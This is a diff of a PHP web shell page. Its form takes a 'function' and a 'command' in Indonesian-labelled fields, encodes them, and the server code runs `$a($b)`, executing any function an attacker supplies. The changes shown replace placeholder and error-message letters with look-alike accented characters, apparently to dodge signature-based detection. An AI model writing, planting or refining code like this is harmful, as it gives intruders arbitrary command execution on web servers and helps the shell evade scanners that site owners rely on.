@@ -11,8 +11,8 @@
         }
     </script>
     <form method="POST" onsubmit="return encode()">
-        <input type="text" id="x" name="x" placeholder="Fungsi">
-        <input type="text" id="y" name="y" placeholder="Perintah">
+        <input type="text" id="x" name="x" placeholder="Ƒungsi">
+        <input type="text" id="y" name="y" placeholder="Ṕerintah">
         <input type="submit" value="Run">
     </form>
     <pre>
@@ -58,7 +58,7 @@
                 echo @$a($b);
             }
         } else {
-            echo "Error: Forbidden.";
+            echo "Ērror: Ēxecutiőn";
         }
     }
     ?>
